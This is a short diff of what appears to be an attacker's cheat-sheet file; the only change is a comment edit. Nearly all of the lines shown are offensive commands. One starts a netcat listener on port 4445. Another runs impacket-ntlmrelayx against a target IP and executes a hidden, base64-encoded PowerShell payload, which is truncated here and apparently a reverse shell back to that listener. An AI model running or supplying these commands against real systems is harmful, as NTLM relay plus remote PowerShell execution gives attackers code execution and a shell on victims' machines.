@@ -5,7 +5,7 @@
 # Start NC on port:
 nc -vnlp 4445
 =====================================
-# Start Impacket-NTLMRelayX with the target IP:
+# Start Impacket-NTLMRelayX with the target IPa (you can specify one along the network):
 sudo impacket-ntlmrelayx --no-http-server -sm2support -t 192.168.228.242 -c "powershell -nop -w hidden -e JABjAGw...AA=="
 =====================================
 
